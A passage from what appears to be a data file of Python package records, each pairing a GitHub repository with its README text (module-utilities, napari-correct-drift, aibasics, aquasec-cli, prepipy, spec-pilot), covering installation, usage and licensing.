- `cached`: A module to cache class attributes and methods. Right now, this uses
  a standard python dictionary for storage. Future versions will hopefully
  integrate with something like [cachetools].

- `docfiller`: A module to share documentation. This is addapted from the
  [pandas `doc` decorator](https://github.com/pandas-dev/pandas/blob/main/pandas/util/_decorators.py).
  There are some convenience functions and classes for sharing documentation.

## Status

This package is actively used by the author. Please feel free to create a pull
request for wanted features and suggestions!

## Quick start

Use one of the following

```bash
pip install module-utilities
```

or

```bash
conda install -c wpk-nist module-utilities
```

## Example usage

```python
import module_utilities

```

<!-- end-docs -->

## Documentation

See the [documentation][docs-link] for a look at `module-utilities` in action.

## License

This is free software. See [LICENSE][license-link].

## Related work

Any other stuff to metion....

## Contact

The author can be reached at wpk@nist.gov.

## Credits

This package was created with
[Cookiecutter](https://github.com/audreyr/cookiecutter) and the
[wpk-nist-gov/cookiecutter-pypackage](https://github.com/wpk-nist-gov/cookiecutter-pypackage)
Project template forked from
[audreyr/cookiecutter-pypackage](https://github.com/audreyr/cookiecutter-pypackage).

# Changelog

Changelog for `module-utilities`

## Unreleased

See the fragment files in [changelog.d](https://github.com/wpk-nist-gov/module-utilities)

<!-- scriv-insert-here -->

This software was developed by employees of the National Institute of Standards
and Technology (NIST), an agency of the Federal Government. Pursuant to title 17
United States Code Section 105, works of NIST employees are not subject to
copyright protection in the United States and are considered to be in the public
domain. Permission to freely use, copy, modify, and distribute this software and
its documentation without fee is hereby granted, provided that this notice and
disclaimer of warranty appears in all copies.

THE SOFTWARE IS PROVIDED 'AS IS' WITHOUT ANY WARRANTY OF ANY KIND, EITHER
EXPRESSED, IMPLIED, OR STATUTORY, INCLUDING, BUT NOT LIMITED TO, ANY WARRANTY
THAT THE SOFTWARE WILL CONFORM TO SPECIFICATIONS, ANY IMPLIED WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND FREEDOM FROM
INFRINGEMENT, AND ANY WARRANTY THAT THE DOCUMENTATION WILL CONFORM TO THE
SOFTWARE, OR ANY WARRANTY THAT THE SOFTWARE WILL BE ERROR FREE. IN NO EVENT
SHALL NIST BE LIABLE FOR ANY DAMAGES, INCLUDING, BUT NOT LIMITED TO, DIRECT,
INDIRECT, SPECIAL OR CONSEQUENTIAL DAMAGES, ARISING OUT OF, RESULTING FROM, OR
IN ANY WAY CONNECTED WITH THIS SOFTWARE, WHETHER OR NOT BASED UPON WARRANTY,
CONTRACT, TORT, OR OTHERWISE, WHETHER OR NOT INJURY WAS SUSTAINED BY PERSONS OR
PROPERTY OR OTHERWISE, AND WHETHER OR NOT LOSS WAS SUSTAINED FROM, OR AROSE OUT
OF THE RESULTS OF, OR USE OF, THE SOFTWARE OR SERVICES PROVIDED HEREUNDER.

Distributions of NIST software should also include copyright and licensing
statements of any third-party software that are legally bundled with the code in
compliance with the conditions of those licenses.
","

[![Repo][repo-badge]][repo-link] [![Docs][docs-badge]][docs-link]
[![PyPI license][license-badge]][license-link]
[![PyPI version][pypi-badge]][pypi-link]
[![Conda (channel only)][conda-badge]][conda-link]
[![Code style: black][black-badge]][black-link]



[black-badge]: https://img.shields.io/badge/code%20style-black-000000.svg
[black-link]: https://github.com/psf/black
[pypi-badge]: https://img.shields.io/pypi/v/module-utilities
[pypi-link]: https://pypi.org/project/module-utilities
[docs-badge]: https://img.shields.io/badge/docs-sphinx-informational
[docs-link]: https://pages.nist.gov/module-utilities/
[repo-badge]: https://img.shields.io/badge/--181717?logo=github&logoColor=ffffff
[repo-link]: https://github.com/wpk-nist-gov/module-utilities
[conda-badge]: https://img.shields.io/conda/v/wpk-nist/module-utilities
[conda-link]: https://anaconda.org/wpk-nist/module-utilities
[license-badge]: https://img.shields.io/pypi/l/cmomy?color=informational
[license-link]:
  https://github.com/wpk-nist-gov/module-utilities/blob/main/LICENSE



[cachetools]: https://github.com/tkem/cachetools/

# `module-utilities`

A Python package for creating python modules.

## Overview

I was using the same code snippets over and over, so decided to put them in one
place.

## Features

- `cached`: A module to cache class attributes and methods. Right now, this uses
  a standard python dictionary for storage. Future versions will hopefully
  integrate with something like [cachetools].

- `docfiller`: A module to share documentation. This is addapted from the
  [pandas `doc` decorator](https://github.com/pandas-dev/pandas/blob/main/pandas/util/_decorators.py).
  There are some convenience functions and classes for sharing documentation.

## Status

This package is actively used by the author. Please feel free to create a pull
request for wanted features and suggestions!

## Quick start

Use one of the following

```bash
pip install module-utilities
```

or

```bash
conda install -c wpk-nist module-utilities
```

## Example usage

```python
import module_utilities

```



## Documentation

See the [documentation][docs-link] for a look at `module-utilities` in action.

## License

This is free software. See [LICENSE][license-link].

## Related work

Any other stuff to metion....

## Contact

The author can be reached at wpk@nist.gov.

## Credits

This package was created with
[Cookiecutter](https://github.com/audreyr/cookiecutter) and the
[wpk-nist-gov/cookiecutter-pypackage](https://github.com/wpk-nist-gov/cookiecutter-pypackage)
Project template forked from
[audreyr/cookiecutter-pypackage](https://github.com/audreyr/cookiecutter-pypackage).

# Changelog

Changelog for `module-utilities`

## Unreleased

See the fragment files in [changelog.d](https://github.com/wpk-nist-gov/module-utilities)



This software was developed by employees of the National Institute of Standards
and Technology (NIST), an agency of the Federal Government. Pursuant to title 17
United States Code Section 105, works of NIST employees are not subject to
copyright protection in the United States and are considered to be in the public
domain. Permission to freely use, copy, modify, and distribute this software and
its documentation without fee is hereby granted, provided that this notice and
disclaimer of warranty appears in all copies.

THE SOFTWARE IS PROVIDED 'AS IS' WITHOUT ANY WARRANTY OF ANY KIND, EITHER
EXPRESSED, IMPLIED, OR STATUTORY, INCLUDING, BUT NOT LIMITED TO, ANY WARRANTY
THAT THE SOFTWARE WILL CONFORM TO SPECIFICATIONS, ANY IMPLIED WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND FREEDOM FROM
INFRINGEMENT, AND ANY WARRANTY THAT THE DOCUMENTATION WILL CONFORM TO THE
SOFTWARE, OR ANY WARRANTY THAT THE SOFTWARE WILL BE ERROR FREE. IN NO EVENT
SHALL NIST BE LIABLE FOR ANY DAMAGES, INCLUDING, BUT NOT LIMITED TO, DIRECT,
INDIRECT, SPECIAL OR CONSEQUENTIAL DAMAGES, ARISING OUT OF, RESULTING FROM, OR
IN ANY WAY CONNECTED WITH THIS SOFTWARE, WHETHER OR NOT BASED UPON WARRANTY,
CONTRACT, TORT, OR OTHERWISE, WHETHER OR NOT INJURY WAS SUSTAINED BY PERSONS OR
PROPERTY OR OTHERWISE, AND WHETHER OR NOT LOSS WAS SUSTAINED FROM, OR AROSE OUT
OF THE RESULTS OF, OR USE OF, THE SOFTWARE OR SERVICES PROVIDED HEREUNDER.

Distributions of NIST software should also include copyright and licensing
statements of any third-party software that are legally bundled with the code in
compliance with the conditions of those licenses.
",wpk-nist-gov/module-utilities
napari-correct-drift,https://github.com/sommerc/napari-correct-drift,9,2290,2290,"# napari-correct-drift

[![License BSD-3](https://img.shields.io/pypi/l/napari-correct-drift.svg?color=green)](https://github.com/sommerc/napari-correct-drift/raw/main/LICENSE)
[![PyPI](https://img.shields.io/pypi/v/napari-correct-drift.svg?color=green)](https://pypi.org/project/napari-correct-drift)
[![Python Version](https://img.shields.io/pypi/pyversions/napari-correct-drift.svg?color=green)](https://python.org)
[![tests](https://github.com/sommerc/napari-correct-drift/workflows/tests/badge.svg)](https://github.com/sommerc/napari-correct-drift/actions)
[![codecov](https://codecov.io/gh/sommerc/napari-correct-drift/branch/main/graph/badge.svg)](https://codecov.io/gh/sommerc/napari-correct-drift)
[![napari hub](https://img.shields.io/endpoint?url=https://api.napari-hub.org/shields/napari-correct-drift)](https://napari-hub.org/plugins/napari-correct-drift)

Napari-correct-drift brings the functionality of Fiji’s popular Correct-3D-drift macro to Napari for flexible and efficient correction of stage and sample drift common in time-lapse microscopy.

Napari-correct-drift supports drift correction for 2D/3D multi-channel data.

----------------------------------
## Example

*to come soon*


## Test data
Napari-correct-drift contains synthetic sample data. To test it on real data download an example Arabidopsis growing [root tip](https://seafile.ist.ac.at/f/b05362d4f358430c8c59/?dl=1) file.

## Installation

You can install `napari-correct-drift` via [pip]:

    pip install napari-correct-drift



To install latest development version :

    pip install git+https://github.com/sommerc/napari-correct-drift.git

## Roadmap

- [x] Basic CorrectDrift interface
- [x] Synthetic test data
- [x] Unit tests
- [x] 2D/3D multi-channel support
- [x] ROI support
- [x] Saving and loading of drift tables
- [ ] [pyGPUreg](https://github.com/bionanopatterning/pyGPUreg) backend
- [ ] Outlier handling
- [ ] Speed optimizations
- [ ] Sphinx documentation
- [ ] How-tos
- [ ] Tutorials and Guides

## Contributing

Contributions are very welcome. Tests can be run with [tox], please ensure
the coverage at least stays the same before you submit a pull request.

## License

Distributed under the terms of the [BSD-3] license,
""napari-correct-drift"" is free and open source software
","# napari-correct-drift

[![License BSD-3](https://img.shields.io/pypi/l/napari-correct-drift.svg?color=green)](https://github.com/sommerc/napari-correct-drift/raw/main/LICENSE)
[![PyPI](https://img.shields.io/pypi/v/napari-correct-drift.svg?color=green)](https://pypi.org/project/napari-correct-drift)
[![Python Version](https://img.shields.io/pypi/pyversions/napari-correct-drift.svg?color=green)](https://python.org)
[![tests](https://github.com/sommerc/napari-correct-drift/workflows/tests/badge.svg)](https://github.com/sommerc/napari-correct-drift/actions)
[![codecov](https://codecov.io/gh/sommerc/napari-correct-drift/branch/main/graph/badge.svg)](https://codecov.io/gh/sommerc/napari-correct-drift)
[![napari hub](https://img.shields.io/endpoint?url=https://api.napari-hub.org/shields/napari-correct-drift)](https://napari-hub.org/plugins/napari-correct-drift)

Napari-correct-drift brings the functionality of Fiji’s popular Correct-3D-drift macro to Napari for flexible and efficient correction of stage and sample drift common in time-lapse microscopy.

Napari-correct-drift supports drift correction for 2D/3D multi-channel data.

----------------------------------
## Example

*to come soon*


## Test data
Napari-correct-drift contains synthetic sample data. To test it on real data download an example Arabidopsis growing [root tip](https://seafile.ist.ac.at/f/b05362d4f358430c8c59/?dl=1) file.

## Installation

You can install `napari-correct-drift` via [pip]:

    pip install napari-correct-drift



To install latest development version :

    pip install git+https://github.com/sommerc/napari-correct-drift.git

## Roadmap

- [x] Basic CorrectDrift interface
- [x] Synthetic test data
- [x] Unit tests
- [x] 2D/3D multi-channel support
- [x] ROI support
- [x] Saving and loading of drift tables
- [ ] [pyGPUreg](https://github.com/bionanopatterning/pyGPUreg) backend
- [ ] Outlier handling
- [ ] Speed optimizations
- [ ] Sphinx documentation
- [ ] How-tos
- [ ] Tutorials and Guides

## Contributing

Contributions are very welcome. Tests can be run with [tox], please ensure
the coverage at least stays the same before you submit a pull request.

## License

Distributed under the terms of the [BSD-3] license,
""napari-correct-drift"" is free and open source software
",sommerc/napari-correct-drift
aibasics,https://github.com/chu-aie/aibasics,1,2050,2020,"# AI Uncovered

[![pypi-image]][pypi-url]
[![license-image]][license-url]
[![version-image]][release-url]
[![release-date-image]][release-url]
[![jupyter-book-image]][docs-url]

<!-- Links: -->
[pypi-image]: https://img.shields.io/pypi/v/aibasics
[license-image]: https://img.shields.io/github/license/chu-aie/aibasics
[license-url]: https://github.com/chu-aie/aibasics/blob/main/LICENSE
[version-image]: https://img.shields.io/github/v/release/chu-aie/aibasics?sort=semver
[release-date-image]: https://img.shields.io/github/release-date/chu-aie/aibasics
[release-url]: https://github.com/chu-aie/aibasics/releases
[jupyter-book-image]: https://jupyterbook.org/en/stable/_images/badge.svg

[repo-url]: https://github.com/chu-aie/aibasics
[pypi-url]: https://pypi.org/project/aibasics
[docs-url]: https://aibasics.entelecheia.ai
[changelog]: https://github.com/chu-aie/aibasics/blob/main/CHANGELOG.md
[contributing guidelines]: https://github.com/chu-aie/aibasics/blob/main/CONTRIBUTING.md
<!-- Links: -->

AI Uncovered: A Comprehensive Guide to AI Basics and Applications

- Documentation: [https://aibasics.entelecheia.ai][docs-url]
- GitHub: [https://github.com/chu-aie/aibasics][repo-url]
- PyPI: [https://pypi.org/project/aibasics][pypi-url]

AI Uncovered is a 15-week, beginner-friendly course in Korean, designed to provide a comprehensive introduction to artificial intelligence (AI) and its real-world applications. Students will explore various AI concepts and techniques, such as machine learning, deep learning, natural language processing, and object detection. The course includes hands-on lab sessions using Google Colab, allowing students to practice what they've learned. By the end, students will have a solid understanding of AI fundamentals and be prepared for an AI-driven future.

## Changelog

See the [CHANGELOG] for more information.

## Contributing

Contributions are welcome! Please see the [contributing guidelines] for more information.

## License

This project is released under the [CC-BY-4.0 License][license-url].

","# AI Uncovered

[![pypi-image]][pypi-url]
[![license-image]][license-url]
[![version-image]][release-url]
[![release-date-image]][release-url]
[![jupyter-book-image]][docs-url]


[pypi-image]: https://img.shields.io/pypi/v/aibasics
[license-image]: https://img.shields.io/github/license/chu-aie/aibasics
[license-url]: https://github.com/chu-aie/aibasics/blob/main/LICENSE
[version-image]: https://img.shields.io/github/v/release/chu-aie/aibasics?sort=semver
[release-date-image]: https://img.shields.io/github/release-date/chu-aie/aibasics
[release-url]: https://github.com/chu-aie/aibasics/releases
[jupyter-book-image]: https://jupyterbook.org/en/stable/_images/badge.svg

[repo-url]: https://github.com/chu-aie/aibasics
[pypi-url]: https://pypi.org/project/aibasics
[docs-url]: https://aibasics.entelecheia.ai
[changelog]: https://github.com/chu-aie/aibasics/blob/main/CHANGELOG.md
[contributing guidelines]: https://github.com/chu-aie/aibasics/blob/main/CONTRIBUTING.md


AI Uncovered: A Comprehensive Guide to AI Basics and Applications

- Documentation: [https://aibasics.entelecheia.ai][docs-url]
- GitHub: [https://github.com/chu-aie/aibasics][repo-url]
- PyPI: [https://pypi.org/project/aibasics][pypi-url]

AI Uncovered is a 15-week, beginner-friendly course in Korean, designed to provide a comprehensive introduction to artificial intelligence (AI) and its real-world applications. Students will explore various AI concepts and techniques, such as machine learning, deep learning, natural language processing, and object detection. The course includes hands-on lab sessions using Google Colab, allowing students to practice what they've learned. By the end, students will have a solid understanding of AI fundamentals and be prepared for an AI-driven future.

## Changelog

See the [CHANGELOG] for more information.

## Contributing

Contributions are welcome! Please see the [contributing guidelines] for more information.

## License

This project is released under the [CC-BY-4.0 License][license-url].

",chu-aie/aibasics
aquasec-cli,https://github.com/atav928/aquasec-cli,5,2968,2962,"# aquasec-cli

Aqua Security CLI

## Installation

```bash
>>> python -m pip install aquasec-cli
```

## Usage

__Help Menu of all Groups:__

```bash
>>> aquasec-cli --help
Usage: aquasec-cli [OPTIONS] COMMAND [ARGS]...

  AquaSec CLI tool to manage AquaSec Tenant

Options:
  --help  Show this message and exit.

Commands:
  delete   Deletes created API Auth
  init     Initializes API Auth
  reports  Generate CIS Bench Reports
```

__NOTE:__ Each subcommand has a help menu to assist with the calls being made. This project relies on the yaml or localized configurations being help as they are not passed in the commands as of this release.

__Create API Auth Token:__

```bash
>>> aquasec-cli init --csp_roles=""Auditor"" --csp_roles=""Admin"" --endpoints=""Any""
Initializing API
INFO    : Created WorkloadAuth Token for URL https://1234abcff1.cloud.aquasec.com
```

__Run Report:__

```bash
aquasec-cli  reports --report_type kube_bench --report_location /var/tmp
Report completed Saving
Report written out to /var/tmp/aquasec_report_type_kube_bench_20230424T153825.json
```

__Delete API Auth:__

```bash
>>> aquasec-cli delete                                              
Are you sure you want to delete the auth api token? [y/N]: y
Deleted Auth
```

## Release Info

### v0.0.5

* Updated Readme and changed type from RST to MD
* Reverted snyk workflow file

### v0.0.4

* fixed issue with broken aquasec-api v0.0.3

### v0.0.3

* Fixed installation and dependencies
* locked down dependencies
* added toml and setup.cfg to support furture installations

### v0.0.2

* Bug fix with requirements

## Version

| Version | Build | Changes |
| ------- | ----- | ------- |
| __0.0.2__ | __a1__ | issues with dataclasses getting installed under normal condition |
| __0.0.2__ | __final__ | tested in pytest and seems to now accept the dataclass |
| __0.0.3__ | __a1__ | issues with dataclasses and now yaml getting installed under normal condition |
| __0.0.3__ | __a3__ | migrating to toml and setup.cfg |
| __0.0.3__ | __a4__ | cleaned up utils and updated snyk to confirm pass locally; added to git ignore |
| __0.0.3__ | __a5__ | setup.cfg issues wiht pip |
| __0.0.3__ | __final__ | found issue with toml and other dependencies |
| __0.0.4__ | __final__ | fixed issue with aquaapi dependency |
| __0.0.5__ | __a1__ | fixed readme to point to md file; adjusting snyk |
| __0.0.5__ | __final__ | tested and released |

### Warnings

Use at your own risk!!!

# Security Policy

## Supported Versions

Use this section to tell people about which versions of your project are
currently being supported with security updates.

| Version | Supported          |
| ------- | ------------------ |
| 0.0.x   | &check; |

## Reporting a Vulnerability

Use this section to tell people how to report a vulnerability.

Tell them where to go, how often they can expect to get an update on a
reported vulnerability, what to expect if the vulnerability is accepted or
declined, etc.
","# aquasec-cli

Aqua Security CLI

## Installation

```bash
>>> python -m pip install aquasec-cli
```

## Usage

__Help Menu of all Groups:__

```bash
>>> aquasec-cli --help
Usage: aquasec-cli [OPTIONS] COMMAND [ARGS]...

  AquaSec CLI tool to manage AquaSec Tenant

Options:
  --help  Show this message and exit.

Commands:
  delete   Deletes created API Auth
  init     Initializes API Auth
  reports  Generate CIS Bench Reports
```

__NOTE:__ Each subcommand has a help menu to assist with the calls being made. This project relies on the yaml or localized configurations being help as they are not passed in the commands as of this release.

__Create API Auth Token:__

```bash
>>> aquasec-cli init --csp_roles=""Auditor"" --csp_roles=""Admin"" --endpoints=""Any""
Initializing API
INFO    : Created WorkloadAuth Token for URL https://1234abcff1.cloud.aquasec.com
```

__Run Report:__

```bash
aquasec-cli  reports --report_type kube_bench --report_location /var/tmp
Report completed Saving
Report written out to /var/tmp/aquasec_report_type_kube_bench_20230424T153825.json
```

__Delete API Auth:__

```bash
>>> aquasec-cli delete                                              
Are you sure you want to delete the auth api token? [y/N]: y
Deleted Auth
```

## Release Info

### v0.0.5

* Updated Readme and changed type from RST to MD
* Reverted snyk workflow file

### v0.0.4

* fixed issue with broken aquasec-api v0.0.3

### v0.0.3

* Fixed installation and dependencies
* locked down dependencies
* added toml and setup.cfg to support furture installations

### v0.0.2

* Bug fix with requirements

## Version

| Version | Build | Changes |
| ------- | ----- | ------- |
| __0.0.2__ | __a1__ | issues with dataclasses getting installed under normal condition |
| __0.0.2__ | __final__ | tested in pytest and seems to now accept the dataclass |
| __0.0.3__ | __a1__ | issues with dataclasses and now yaml getting installed under normal condition |
| __0.0.3__ | __a3__ | migrating to toml and setup.cfg |
| __0.0.3__ | __a4__ | cleaned up utils and updated snyk to confirm pass locally; added to git ignore |
| __0.0.3__ | __a5__ | setup.cfg issues wiht pip |
| __0.0.3__ | __final__ | found issue with toml and other dependencies |
| __0.0.4__ | __final__ | fixed issue with aquaapi dependency |
| __0.0.5__ | __a1__ | fixed readme to point to md file; adjusting snyk |
| __0.0.5__ | __final__ | tested and released |

### Warnings

Use at your own risk!!!

# Security Policy

## Supported Versions

Use this section to tell people about which versions of your project are
currently being supported with security updates.

| Version | Supported          |
| ------- | ------------------ |
| 0.0.x   | ✓ |

## Reporting a Vulnerability

Use this section to tell people how to report a vulnerability.

Tell them where to go, how often they can expect to get an update on a
reported vulnerability, what to expect if the vulnerability is accepted or
declined, etc.
",atav928/aquasec-cli
prepipy,https://github.com/teutoburg/prepipy,8,6428,6428,"# prepipy

PREtty PIctures using PYthon

## Overview

This package provides the ability to stretch and combine astronomical images from multiple bands into (RGB) colour images.

Images can be created in two main modes:
- JPEG image containing only the image in the pixel scale of the input, including coordinate information readable by e.g. [Aladin](https://aladin.u-strasbg.fr/).
- *DEVELOPMENT* Matplotlib image containing one ore more RGB conmibations from different bands in a grid layout. World coordinate axes are plotted on the images if available in the original input files. An additional sup-header containing the source name can be included. This mode also supportes multiple different options, such as plotting grid lines on top of the image, marking the center point in the image, of marking additional points of interest within the image, specified by world coordinates. By default, these images are saved in the pdf format.

## What does prepipy *not* do?

- Create an astrometric solution for input images. This must be provided in the FITS headers of the input images. Use a tool like e.g. [SCAMP](https://www.astromatic.net/software/scamp/) for this task.
- Resample the individual images to the same pixel scale. Input images must match exactly in terms of pixel scale, orientation and size (number of pixels along each axis). Prepipy assumes the input images can simply be added on a pixel-by-pixel basis. Use a tool like e.g. [SWarp](https://www.astromatic.net/software/swarp/) for this task.

## Example image

*Add text about example image, bands etc.*

![Example colour image of a star-forming region](https://nemesis.univie.ac.at/wp-content/uploads/2023/02/83.52054-5.39047.jpeg ""Example image created using prepipy, centered around coordinates 83.52054, -5.39047."")


## Basic Usage

### JPEG mode

Current way to use from command line: run the `rgbcombo` script with arguments as described in the help message.

### Matplotlib mode

Development feature, not part of the current release.

### Input data

The input images are expected to fullfill the following criteria:
- FITS format images with the images data appearing in the primary HDU.
- Pixel scale and position matching across all input images. No additional resampling/reprojection is performed.
- WCS information is present in the FITS files.

### Setting options

The package currently uses two YAML configuration files to specify various options. These are referred to as the (general) `config` file and the `bands` file containing meta-information about the bands used in the original data.
If these files are not placed in the working directory, the path to them needs to be specified using the `-c` and `-b` command line options.

## Available classes

### Band

Data class used to store information about a passband.

The recommended way to construct instances is via a YAML config file.
Use the `Band.from_yaml_file(filename)` constructor to do so.
Alternatively, a minimalistic instance can be created by just providing the band name: `Band('foo')`. This will create a useable instance with all other parameters containing default or placeholder values.

### Frame

A `Frame` is an individual image taken in a given `Band`. Instances can be created manually or (recommended) either from a `astropy.io.fits.ImageHDU` object, `astropy.io.fits.HDUList` object plus an index or directly from a FITS file. Use the `from_hdu(hdu_object, band)`, `from_hdul(hdu_list_object, band, hdu_index)` or `from_fits(filename, band, hdu_index)` contructors respectively.

Operations like clipping, normalisation and stretching are performed as methods of the `Frame` class. Individual frames can be saved as single-HDU FITS files (`Frame.save_fits(filename)`).

### Picture

A `Picture` is a collection of one or more `Frame` objects. Frames can be added from a FITS file via `Picture.add_frame_from_file(filename, band)`, where `band` can be an instance of `Band` or, in the minimalistic case, a string containing the band name only. Frames can also be added directly from a 2D numpy array: `Picture.add_frame(image_array, band, header)`, where `header` can be an instance of `astropy.io.fits.Header` or `None`. A third option is to add `Frame` objects manually to the `Picture.frames` list. This has the downside that the frames's band is not checked against the other frames' bands already present in the picture. Normally, only one frame per band is allowed in a picture.

It is also possible to construct a `Picture` object from a 3D array containing 2D images, or to construct multiple instances from a 4D array. Warning: These features are currently highly experimental, not tested and not well documented.

The `Picture` class also provides a number of convenience properties, including `bands`, `primary_frame`, `image`, `coords`, `center`, `center_coords`, `center_coords_str`, `image_size`, `pixel_scale` and `image_scale`.

#### Subclasses of Picture

`RGBPicture` - subclass of `Picture` for handling 3-channel color composite images. A color channel is just a `Frame` object that is included in the `RGBPicture.rgb_channels` list. This attribute is set by calling the `select_rgb_channels(combination)` method. It is possible (and intended) to provide more than three frames for a `RGBPicture`, if multiple color composite images from different band combinations are desired. In this case, `select_rgb_channels(combination)` is called multiple times. Some operations modify only the frames which are set as color channels, so when processing multiple combinations, deep copies of the frames are created before they are modified as color channels.

`JPEGPicture` - subclass of `RGBPicture` for saving the final image as a JPEG (aka jpg) file. Currently one contains one method, `save_pil(filename, quality)`, which uses the interface provided by the `Pillow` package (version 9.4+ is required) to save the image. **NOTE**: in most cases, this is the class you'll want to use when actually dealing with color composite images, unless you want to manually process the 3D array containing the 3-channel image data in some other way.

# Acknowledgement

> This package was initially developed in the course of the [NEMESIS](https://nemesis.univie.ac.at) project at the University of Vienna. The NEMESIS project has received funding from the European Union's Horizon 2020 research and innovation programme under grant agreement No. 101004141.
","# prepipy

PREtty PIctures using PYthon

## Overview

This package provides the ability to stretch and combine astronomical images from multiple bands into (RGB) colour images.

Images can be created in two main modes:
- JPEG image containing only the image in the pixel scale of the input, including coordinate information readable by e.g. [Aladin](https://aladin.u-strasbg.fr/).
- *DEVELOPMENT* Matplotlib image containing one ore more RGB conmibations from different bands in a grid layout. World coordinate axes are plotted on the images if available in the original input files. An additional sup-header containing the source name can be included. This mode also supportes multiple different options, such as plotting grid lines on top of the image, marking the center point in the image, of marking additional points of interest within the image, specified by world coordinates. By default, these images are saved in the pdf format.

## What does prepipy *not* do?

- Create an astrometric solution for input images. This must be provided in the FITS headers of the input images. Use a tool like e.g. [SCAMP](https://www.astromatic.net/software/scamp/) for this task.
- Resample the individual images to the same pixel scale. Input images must match exactly in terms of pixel scale, orientation and size (number of pixels along each axis). Prepipy assumes the input images can simply be added on a pixel-by-pixel basis. Use a tool like e.g. [SWarp](https://www.astromatic.net/software/swarp/) for this task.

## Example image

*Add text about example image, bands etc.*

![Example colour image of a star-forming region](https://nemesis.univie.ac.at/wp-content/uploads/2023/02/83.52054-5.39047.jpeg ""Example image created using prepipy, centered around coordinates 83.52054, -5.39047."")


## Basic Usage

### JPEG mode

Current way to use from command line: run the `rgbcombo` script with arguments as described in the help message.

### Matplotlib mode

Development feature, not part of the current release.

### Input data

The input images are expected to fullfill the following criteria:
- FITS format images with the images data appearing in the primary HDU.
- Pixel scale and position matching across all input images. No additional resampling/reprojection is performed.
- WCS information is present in the FITS files.

### Setting options

The package currently uses two YAML configuration files to specify various options. These are referred to as the (general) `config` file and the `bands` file containing meta-information about the bands used in the original data.
If these files are not placed in the working directory, the path to them needs to be specified using the `-c` and `-b` command line options.

## Available classes

### Band

Data class used to store information about a passband.

The recommended way to construct instances is via a YAML config file.
Use the `Band.from_yaml_file(filename)` constructor to do so.
Alternatively, a minimalistic instance can be created by just providing the band name: `Band('foo')`. This will create a useable instance with all other parameters containing default or placeholder values.

### Frame

A `Frame` is an individual image taken in a given `Band`. Instances can be created manually or (recommended) either from a `astropy.io.fits.ImageHDU` object, `astropy.io.fits.HDUList` object plus an index or directly from a FITS file. Use the `from_hdu(hdu_object, band)`, `from_hdul(hdu_list_object, band, hdu_index)` or `from_fits(filename, band, hdu_index)` contructors respectively.

Operations like clipping, normalisation and stretching are performed as methods of the `Frame` class. Individual frames can be saved as single-HDU FITS files (`Frame.save_fits(filename)`).

### Picture

A `Picture` is a collection of one or more `Frame` objects. Frames can be added from a FITS file via `Picture.add_frame_from_file(filename, band)`, where `band` can be an instance of `Band` or, in the minimalistic case, a string containing the band name only. Frames can also be added directly from a 2D numpy array: `Picture.add_frame(image_array, band, header)`, where `header` can be an instance of `astropy.io.fits.Header` or `None`. A third option is to add `Frame` objects manually to the `Picture.frames` list. This has the downside that the frames's band is not checked against the other frames' bands already present in the picture. Normally, only one frame per band is allowed in a picture.

It is also possible to construct a `Picture` object from a 3D array containing 2D images, or to construct multiple instances from a 4D array. Warning: These features are currently highly experimental, not tested and not well documented.

The `Picture` class also provides a number of convenience properties, including `bands`, `primary_frame`, `image`, `coords`, `center`, `center_coords`, `center_coords_str`, `image_size`, `pixel_scale` and `image_scale`.

#### Subclasses of Picture

`RGBPicture` - subclass of `Picture` for handling 3-channel color composite images. A color channel is just a `Frame` object that is included in the `RGBPicture.rgb_channels` list. This attribute is set by calling the `select_rgb_channels(combination)` method. It is possible (and intended) to provide more than three frames for a `RGBPicture`, if multiple color composite images from different band combinations are desired. In this case, `select_rgb_channels(combination)` is called multiple times. Some operations modify only the frames which are set as color channels, so when processing multiple combinations, deep copies of the frames are created before they are modified as color channels.

`JPEGPicture` - subclass of `RGBPicture` for saving the final image as a JPEG (aka jpg) file. Currently one contains one method, `save_pil(filename, quality)`, which uses the interface provided by the `Pillow` package (version 9.4+ is required) to save the image. **NOTE**: in most cases, this is the class you'll want to use when actually dealing with color composite images, unless you want to manually process the 3D array containing the 3-channel image data in some other way.

# Acknowledgement

> This package was initially developed in the course of the [NEMESIS](https://nemesis.univie.ac.at) project at the University of Vienna. The NEMESIS project has received funding from the European Union's Horizon 2020 research and innovation programme under grant agreement No. 101004141.
",teutoburg/prepipy
spec-pilot,https://github.com/jmfwolf/spec-pilot,3,3397,3397,"# Spec-Pilot

Spec-Pilot is a command-line tool and Python package that helps generate, modify, and validate OpenAPI specifications using natural language processing (NLP). It simplifies the creation and management of OpenAPI projects, making it more accessible to developers and non-developers alike.

## Features

- Initialize new OpenAPI projects
- Generate OpenAPI specifications
- Modify OpenAPI specifications using natural language
- Validate OpenAPI specifications
- Create OpenAPI assets from templates

## Installation

You can install Spec-Pilot using pip:

```bash
pip install spec_pilot
```

After installing Spec-Pilot, you also need to download the spaCy language model:

```bash
python -m spacy download en_core_web_sm
```

## CLI Usage

To use Spec-Pilot as a command-line tool, run the following commands:

- Initialize a new OpenAPI project:

```bash
spec_pilot --init project_name
```

- Generate the OpenAPI specification for a specific project:

```bash
spec_pilot --generate project_name
```

- Modify an existing OpenAPI specification using natural language:

```bash
spec_pilot --nlp ""Add a new endpoint called 'get_users' with a GET method""
```

- Validate an OpenAPI specification file:

```bash
spec_pilot --validate spec_file
```

- Create a new OpenAPI asset from a template:

```bash
spec_pilot --create template asset_name output_path
```
## Generate and save your OpenAPI components using the corresponding functions

## Python Package Usage

You can also use Spec-Pilot as a Python package in your projects. Here's an example of how to use it:

```python
from spec_pilot import init_project, generate_openapi_spec, process_natural_language_input, vacuum, render_template

# Initialize a new OpenAPI project
init_project(""project_name"")

# Generate the OpenAPI specification for a specific project
generate_openapi_spec(""project_name"")

# Modify an existing OpenAPI specification using natural language
modified_openapi_spec = process_natural_language_input(""Add a new endpoint called 'get_users' with a GET method"", openapi_spec)

# Validate an OpenAPI specification file
vacuum([""validate"", ""spec_file""])

# Create a new OpenAPI asset from a template
render_template(""template"", ""asset_name"", ""output_path"")
```

## Limitations of NLP Functionality

Spec-Pilot's NLP functionality is currently limited and may not understand all possible natural language inputs. It can handle basic operations such as adding, updating, and removing endpoints, methods, and parameters. However, it might not handle complex operations or understand all possible variations of natural language expressions.

## Roadmap

To improve the NLP functionality and make Spec-Pilot more complete, we plan to:

1. Expand the range of natural language expressions that can be understood by the tool.
2. Add support for more complex operations, such as modifying response schemas and security settings.
3. Enhance error handling and provide better feedback to users when their input cannot be understood or processed.
4. Integrate with more advanced NLP libraries or services to improve the overall performance and accuracy of the tool.

